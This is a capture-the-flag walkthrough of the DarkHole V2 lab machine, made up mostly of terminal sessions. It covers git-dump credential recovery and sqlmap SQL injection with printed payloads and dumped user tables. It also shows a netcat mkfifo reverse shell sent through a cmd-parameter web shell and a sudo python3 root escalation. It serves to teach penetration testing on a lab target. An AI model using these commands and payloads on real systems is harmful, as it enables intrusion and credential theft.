@@ -1,0 +1,398 @@
+└─# ping 192.168.154.142                                    
+PING 192.168.154.142 (192.168.154.142) 56(84) bytes of data.
+64 bytes from 192.168.154.142: icmp_seq=1 ttl=64 time=0.797 ms
+64 bytes from 192.168.154.142: icmp_seq=2 ttl=64 time=0.859 ms
+^C
+--- 192.168.154.142 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1006ms
+rtt min/avg/max/mdev = 0.797/0.828/0.859/0.031 ms
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -sC -sV -T3 192.168.154.142 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-15 11:48 -0500
+Nmap scan report for 192.168.154.142
+Host is up (0.00039s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)
+|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)
+|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-git: 
+|   192.168.154.142:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: i changed login.php file for more secure 
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: DarkHole V2
+MAC Address: 00:0C:29:03:08:9F (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+by running the ip in the browser we find the dource code having the path of the page being
+
+style/index.css">
+
+and another page called login.php">Login</a></li>
+-------------------------------------------------------------------------------------------------------------------
+login.php">Login</a></li>
+its source code has an indication of a users 
+
+    <!-- <a href="file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/Project_1.html"><h1>Sign In</h1></a> -->
+    <!-- <a href="file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/P2.html">  <h1>Log In</h1></a> -->
+    <form action="" method="post">
+    
+ meaning the user is SAURABH SINGH
+ -------------------------------------------------------------------------------------------------------------------
+FROM THE NMPA ENUMERATION WE GET A .git git folder in the port for http which means git can be assecced using http in that port -------------------------------------------------------------------------------------------------------------------
+ install git dumper that would get the history of the git repo of the developer for recon purposes
+ 
+ # pip install -r requirements.txt --break-system-packages 
+
+having this we should creat a folder that we would store the git data in that is
+
+└─# mkdir 1234
+                                                                                                                    extracting the git data
+┌──(root㉿kali)-[/home/kali/Music/git-dumper]
+└─# python3 git_dumper.py http://192.168.154.142/.git/ 1234 
+
+
+┌──(root㉿kali)-[/home/kali/Music/git-dumper/1234]
+└─# ls -la            
+total 48
+drwxr-xr-x 7 root root 4096 Jan 15 12:52 .
+drwxr-xr-x 4 root root 4096 Jan 15 12:50 ..
+drwxr-xr-x 7 root root 4096 Jan 15 12:52 .git
+drwxr-xr-x 2 root root 4096 Jan 15 12:52 .idea
+drwxr-xr-x 2 root root 4096 Jan 15 12:52 config
+-rw-r--r-- 1 root root 5578 Jan 15 12:52 dashboard.php
+-rw-r--r-- 1 root root 1094 Jan 15 12:52 index.php
+drwxr-xr-x 2 root root 4096 Jan 15 12:52 js
+-rw-r--r-- 1 root root 1493 Jan 15 12:52 login.php
+-rw-r--r-- 1 root root  179 Jan 15 12:52 logout.php
+drwxr-xr-x 2 root root 4096 Jan 15 12:52 style
+                                                                                                                
+┌──(root㉿kali)-[/home/kali/Music/git-dumper/1234]
+└─# git log                                            
+commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -> master)
+Author: Jehad Alqurashi <anmar-v7@hotmail.com>
+Date:   Mon Aug 30 13:14:32 2021 +0300
+
+    i changed login.php file for more secure
+
+commit a4d900a8d85e8938d3601f3cef113ee293028e10
+Author: Jehad Alqurashi <anmar-v7@hotmail.com>
+Date:   Mon Aug 30 13:06:20 2021 +0300
+
+    I added login.php file with default credentials
+
+commit aa2a5f3aa15bb402f2b90a07d86af57436d64917
+Author: Jehad Alqurashi <anmar-v7@hotmail.com>
+Date:   Mon Aug 30 13:02:44 2021 +0300
+
+    First Initialize
+                                                                                                                
+┌──(root㉿kali)-[/home/kali/Music/git-dumper/1234]
+└─# git diff f1d821f48a9cf662f285457a5ce9af6b9feb2c4
+fatal: ambiguous argument 'f1d821f48a9cf662f285457a5ce9af6b9feb2c4': unknown revision or path not in the workinge.
+Use '--' to separate paths from revisions, like this:
+'git <command> [<revision>...] -- [<file>...]'
+                                                                                                                
+┌──(root㉿kali)-[/home/kali/Music/git-dumper/1234]
+└─# git diff a4d900a8d85e8938d3601f3cef113ee293028e10
+diff --git a/login.php b/login.php
+index 8a0ff67..0904b19 100644
+--- a/login.php
++++ b/login.php
+@@ -2,7 +2,10 @@
+ session_start();
+ require 'config/config.php';
+ if($_SERVER['REQUEST_METHOD'] == 'POST'){
+-    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
++    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));
++    $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));
++    $check = $connect->query("select * from users where email='$email' and password='$pass' and id=1");
++    if($check->num_rows){
+         $_SESSION['userid'] = 1;
+         header("location:dashboard.php");
+         die();
+-------------------------------------------------------------------------------------------------------------------
+we get new creadentials being 
+lush@admin.com
+321
+
+use this ones to logiiin 
+-------------------------------------------------------------------------------------------------------------------
+ the new page found is 
+ http://192.168.154.142/dashboard.php?id=1
+ in which the id = 1 can be changed to 1 2 3 so we can try find if its sql injected by using sqlmap
+ 
+ ┌──(root㉿kali)-[/home/kali/Music/git-dumper/1234]
+└─# sqlmap --url "http://192.168.154.142/dashboard.php?id=1" --dbs --batch
+but shows its not sql injectable
+
+------------------------------------------------------------------------------------------------------------------
+this time we would capture the request of that page aand use it to look if the page is sql injectable using burpsuite the request we would store it in dashboard_sql.req file and run 
+
+└─# sqlmap -r dashboard_sql.req --dbs --batch  
+
+OUTPUT BEING
+[13:26:17] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[13:26:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[13:26:27] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[13:26:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[13:26:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[13:26:27] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[13:26:27] [INFO] target URL appears to have 6 columns in query
+[13:26:27] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 3246 FROM (SELECT(SLEEP(5)))rFdO) AND 'meOB'='meOB
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=-5006' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71706a6271,0x624b544d794853636172597367725a53786d71494d694250445959646a674f454579446958415a78,0x716b6b7871),NULL-- -
+---
+[13:26:28] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.0.12
+[13:26:28] [INFO] fetching database names
+available databases [5]:
+[*] darkhole_2
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+
+[13:26:28] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 27 times
+[13:26:28] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.154.142'
+
+[*] ending @ 13:26:28 /2026-01-15/
+
+-----------------------------------------------------------------------------------------------------------------
+WE WOULD LOOK AT TABLES IN THE DATABSE darkhole_2
+-----------------------------------------------------------------------------------------------------------------
+
+┌──(root㉿kali)-[/home/kali/Documents/Vulnubs/darkhole 1]
+└─# sqlmap -r dashboard_sql.req --batch -D darkhole_2 --tables
+        ___
+       __H__                                                                                                    
+ ___ ___[']_____ ___ ___  {1.9.12#stable}                                                                       
+|_ -| . [)]     | .'| . |                                                                                       
+|___|_  ["]_|_|_|__,|  _|                                                                                       
+      |_|V...       |_|   https://sqlmap.org                                                                    
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:46:18 /2026-01-15/
+
+[13:46:18] [INFO] parsing HTTP request from 'dashboard_sql.req'
+[13:46:18] [INFO] resuming back-end DBMS 'mysql' 
+[13:46:18] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 3246 FROM (SELECT(SLEEP(5)))rFdO) AND 'meOB'='meOB
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=-5006' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71706a6271,0x624b544d794853636172597367725a53786d71494d694250445959646a674f454579446958415a78,0x716b6b7871),NULL-- -
+---
+[13:46:18] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.0.12
+[13:46:18] [INFO] fetching tables for database: 'darkhole_2'
+Database: darkhole_2
+[2 tables]
++-------+
+| ssh   |
+| users |
++-------+
+
+[13:46:18] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.154.142'
+
+[*] ending @ 13:46:18 /2026-01-15/
+
+------------------------------------------------------------------------------------------------------------------
+LOOKING AT THE TABLES DETAILS USING
+------------------------------------------------------------------------------------------------------------------
+
+┌──(root㉿kali)-[/home/kali/Documents/Vulnubs/darkhole 1]
+└─# sqlmap -r dashboard_sql.req --batch -D darkhole_2 -T ssh,users --dump
+        ___
+       __H__                                                                                                    
+ ___ ___[,]_____ ___ ___  {1.9.12#stable}                                                                       
+|_ -| . [']     | .'| . |                                                                                       
+|___|_  [)]_|_|_|__,|  _|                                                                                       
+      |_|V...       |_|   https://sqlmap.org                                                                    
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:48:02 /2026-01-15/
+
+[13:48:02] [INFO] parsing HTTP request from 'dashboard_sql.req'
+[13:48:03] [INFO] resuming back-end DBMS 'mysql' 
+[13:48:03] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 3246 FROM (SELECT(SLEEP(5)))rFdO) AND 'meOB'='meOB
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=-5006' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71706a6271,0x624b544d794853636172597367725a53786d71494d694250445959646a674f454579446958415a78,0x716b6b7871),NULL-- -
+---
+[13:48:03] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.0.12
+[13:48:03] [INFO] fetching columns for table 'ssh' in database 'darkhole_2'
+[13:48:03] [INFO] fetching entries for table 'ssh' in database 'darkhole_2'
+Database: darkhole_2
+Table: ssh
+[1 entry]
++----+------+--------+
+| id | pass | user   |
++----+------+--------+
+| 1  | fool | jehad  |
++----+------+--------+
+
+[13:48:03] [INFO] table 'darkhole_2.ssh' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.154.142/dump/darkhole_2/ssh.csv'                                                                                          
+[13:48:03] [INFO] fetching columns for table 'users' in database 'darkhole_2'
+[13:48:03] [INFO] fetching entries for table 'users' in database 'darkhole_2'
+Database: darkhole_2
+Table: users
+[1 entry]
++----+----------------+-------------------------------------------+----------+-----------------------------+----------------+
+| id | email          | address                                   | password | username                    | contact_number |
++----+----------------+-------------------------------------------+----------+-----------------------------+----------------+
+| 1  | lush@admin.com |  Street, Pincode, Province/State, Country | 321      | Jehad Alqurashiasddasdasdas | 1              |
++----+----------------+-------------------------------------------+----------+-----------------------------+----------------+
+
+[13:48:04] [INFO] table 'darkhole_2.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.154.142/dump/darkhole_2/users.csv'                                                                                      
+[13:48:04] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.154.142'
+
+[*] ending @ 13:48:04 /2026-01-15/
+
+------------------------------------------------------------------------------------------------------------------
+USING THIS DATA WE CAN TRY SSHing into the machine
+------------------------------------------------------------------------------------------------------------------
+
+┌──(root㉿kali)-[/home/kali/Documents/Vulnubs/darkhole 1]
+└─# ssh -i fool jehad@192.168.154.142
+
+------------------------------------------------------------------------------------------------------------------
+THE FIRST FLAG IS 
+------------------------------------------------------------------------------------------------------------------
+
+jehad@darkhole:/home$ ls
+jehad  lama  losy
+jehad@darkhole:/home$ cd losy
+jehad@darkhole:/home/losy$ ls
+user.txt
+jehad@darkhole:/home/losy$ cat user.txt 
+DarkHole{'This_is_the_life_man_better_than_a_cruise'}
+
+------------------------------------------------------------------------------------------------------------------
+RUNNNING LINPEAS GIVES US INFORMATION ON A SEVER LOCATION 
+------------------------------------------------------------------------------------------------------------------
+
+losy  cd /opt/web && php -S localhost:9999
+
+run the bellow command so that we have an open termianl for a connection in the browser
+ssh -L 9999:localhost:9999 jehad@192.168.154.142
+
+IN THE BROWSER WE CAN RUNN THE LOCALHOST ADDRESS LIKE BELLOW
+
+http://localhost:9999/?cmd=whoami
+
+the parameter included is the cmd which interacts with the cmd shell in the machine 
+
+------------------------------------------------------------------------------------------------------------------
+FIND THE REVERSESHELL COMMANDS EG (reverseshell generator) in gooole and pass it the cmd parameter 
+but urls have encoding in the inputed info the inputted data after cmd = should be url encoded eg in 
+burpsuite of using the inspect tab in the webpage
+------------------------------------------------------------------------------------------------------------------
+run  in kali terminal
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9001
+
+in this case the reverseshll working is 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.154.132 9001 >/tmp/f
+
+running it we run the bellow url after encoding
+http://localhost:9999/?cmd=rm %2Ftmp%2Ff%3Bmkfifo %2Ftmp%2Ff%3Bcat %2Ftmp%2Ff|sh -i 2>%261|nc 192.168.154.132 9001 >%2Ftmp%2Ff
+
+------------------------------------------------------------------------------------------------------------------
+INSIDE THE SHELL RUN
+------------------------------------------------------------------------------------------------------------------
+
+whoami i we would identifuy taht we are in losys user profile 
+
+run
+
+bash -i -p
+to change in to the interactive shell 
+
+cd inside losys folder 
+cat .bash_history
+we get the passoword as
+password:gang 
+
+------------------------------------------------------------------------------------------------------------------
+NOW WE HAVE USER losy nad password gang 
+login into its ssh
+------------------------------------------------------------------------------------------------------------------
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i gang losy@192.168.154.142
+
+look for file or users benig given permissions which is the python 
+
+losy@darkhole:~$ sudo -l
+[sudo] password for losy: 
+Matching Defaults entries for losy on darkhole:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User losy may run the following commands on darkhole:
+    (root) /usr/bin/python3
+    
+having this we can privilede escalate the losy user to enter into the root shell
+by running a bash shell inside it using the permissions given to python3
+python -c 'import os; os.execl("/bin/sh", "sh")'  
+
+command being
+sudo /usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash")'
+
+------------------------------------------------------------------------------------------------------------------
+FINAL FLAG
+------------------------------------------------------------------------------------------------------------------
+
+root@darkhole:/home/losy# cd /root
+root@darkhole:~# ls
+root.txt  snap
+root@darkhole:~# cat root.txt 
+DarkHole{'Legend'}
+    
+
+
+
